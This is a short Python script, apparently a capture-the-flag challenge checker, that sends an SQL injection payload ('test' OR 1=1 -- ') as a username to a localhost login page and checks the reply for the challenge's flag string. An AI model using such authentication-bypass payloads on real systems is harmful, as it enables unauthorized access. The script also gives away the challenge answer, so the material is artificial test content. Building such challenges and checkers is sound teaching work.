#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import requests

# Login
response = requests.post("http://localhost:1337/login",
                         data={"username": "test' OR 1=1 -- ", "password": "test"})

if response.status_code != 200 or "hackmac{jabb3d_w1th_th3_BOOLEAN}" not in response.text:
    exit(1)

exit(0)
